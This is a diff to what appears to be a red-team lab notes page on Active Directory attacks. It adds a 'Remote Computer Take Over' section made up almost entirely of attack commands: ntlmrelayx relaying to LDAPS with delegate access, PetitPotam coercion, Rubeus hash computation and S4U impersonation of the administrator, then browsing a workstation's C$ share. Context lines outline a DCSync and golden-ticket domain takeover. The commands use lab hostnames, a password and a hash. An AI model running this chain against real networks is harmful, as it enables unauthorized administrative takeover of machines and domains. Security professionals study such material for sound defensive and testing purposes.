@@ -26,7 +26,7 @@ Below provides a high level overview of how the attack works:
 8. Use target DC's computer account TGT to perform [DCSync](dump-password-hashes-from-domain-controller-with-dcsync.md) and pull the NTLM hash of `krbtgt`;
 9. Use `krbtgt` NTLM hash to create [Golden Tickets](kerberos-golden-tickets.md) that allow you to impersonate any domain user, including Domain Admin.
 
-## Walkthrough
+## Domain Take Over
 
 ### Lab Setup
 
@@ -147,9 +147,53 @@ It's worth remembering that in some AD environments there will be highly privile
 * Use service account's certificate to request its Kerberos TGT;
 * You've now gained administrative privileges on machines the compromised service account can access.
 
+## Remote Computer Take Over
+
+It turns out, that it's also possible to gain administrative privileges over any remote computer given we have network access to that computer as discovered by Lee Christensen:
+
+{% embed url="https://twitter.com/tifkin\_/status/1418855927575302144/photo/1" %}
+
+
+
+{% page-ref page="resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md" %}
+
+```text
+examples/ntlmrelayx.py -t ldaps://dc01 -smb2support --delegate-access
+```
+
+```text
+.\PetitPotam.exe kali@80/spotless.txt 10.0.0.7
+```
+
+![](../../.gitbook/assets/image%20%281043%29.png)
+
+![](../../.gitbook/assets/image%20%281048%29.png)
+
+![](../../.gitbook/assets/image%20%281042%29.png)
+
+```text
+.\Rubeus.exe hash /domain:offense.local /user:QUAIIVVE$ /password:'K_-Jzsb&uK!`TIH'
+```
+
+![](../../.gitbook/assets/image%20%281041%29.png)
+
+```text
+.\Rubeus.exe s4u /user:QUAIIVVE$ /rc4:3F55290748348504327CDA267FCCA190 /impersonateuser:administrator@offense.local /msdsspn:cifs/ws01.offense.local /ptt /domain:offense.local
+```
+
+![](../../.gitbook/assets/image%20%281050%29.png)
+
+```text
+ls \\ws01.offense.local\c$
+```
+
+![](../../.gitbook/assets/image%20%281037%29.png)
+
 ## References
 
 {% embed url="https://posts.specterops.io/certified-pre-owned-d95910965cd2" %}
 
 {% embed url="https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429" %}
+
+{% embed url="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/" %}
 
